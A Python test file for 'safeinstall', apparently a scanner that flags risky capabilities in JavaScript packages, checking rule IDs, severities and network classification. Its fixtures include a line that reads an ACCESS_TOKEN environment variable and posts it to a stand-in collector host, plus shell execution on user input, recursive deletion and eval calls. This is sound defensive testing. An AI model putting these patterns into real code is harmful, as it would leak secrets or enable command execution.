from safeinstall.models import Capability, Severity, SourceFile
from safeinstall.risk.engine import RiskEngine
from safeinstall.scanners.javascript import JavaScriptScanner


def test_javascript_scanner_reports_capabilities_without_treating_comments_as_code() -> None:
    source = SourceFile(
        path="src/install.js",
        language="javascript",
        content=(
            "// child_process.exec(userInput)\n"
            "const child_process = require('child_process');\n"
            "child_process.spawn('git', ['status']);\n"
            "const home = process.env.HOME;\n"
            "fetch('https://api.github.com/repos/example/project');\n"
            "fs.rm(cachePath, { recursive: true });\n"
        ),
    )

    findings = JavaScriptScanner().scan(source)

    assert [finding.rule_id for finding in findings] == [
        "SI-JS-001",
        "SI-JS-006",
        "SI-JS-005",
        "SI-JS-003",
    ]
    assert findings[0].severity is Severity.MEDIUM
    assert Capability.SHELL_EXECUTION in findings[0].capabilities
    assert Capability.GIT_OPERATIONS in findings[0].capabilities
    assert Capability.FILE_DELETE in findings[-1].capabilities


def test_node_environment_plus_unknown_post_forms_a_high_risk_chain() -> None:
    source = SourceFile(
        path="src/telemetry.js",
        language="javascript",
        content=(
            "const token = process.env.ACCESS_TOKEN;\n"
            "axios.post('https://collector.example.invalid/events', { token });\n"
        ),
    )

    findings = JavaScriptScanner().scan(source)
    assessment = RiskEngine().assess(findings)

    network = next(finding for finding in findings if finding.rule_id == "SI-JS-005")
    assert network.metadata == {
        "destination": "unknown",
        "method": "POST",
        "transport": "http",
    }
    assert assessment.level is Severity.HIGH


def test_javascript_findings_are_bounded_per_file() -> None:
    source = SourceFile(
        path="generated.js",
        language="javascript",
        content="eval(value);\n" * 1_001,
    )

    findings = JavaScriptScanner().scan(source)

    assert len(findings) == 1_000


def test_javascript_network_analysis_covers_socket_websocket_upload_and_webhook() -> None:
    source = SourceFile(
        path="src/network.js",
        language="javascript",
        content=(
            "net.createConnection({ host: 'example.invalid', port: 443 });\n"
            "new WebSocket('wss://stream.example.invalid/events');\n"
            "fetch('https://hooks.example.invalid/webhook', { method: 'POST', body: payload });\n"
        ),
    )

    findings = JavaScriptScanner().scan(source)

    network = [finding for finding in findings if finding.rule_id == "SI-JS-005"]
    assert [finding.metadata["transport"] for finding in network] == [
        "socket",
        "websocket",
        "http",
    ]
    assert any(finding.rule_id == "SI-JS-008" for finding in findings)
    hints = {finding.metadata.get("hint") for finding in findings if finding.rule_id == "SI-JS-009"}
    assert hints == {"telemetry", "webhook"}
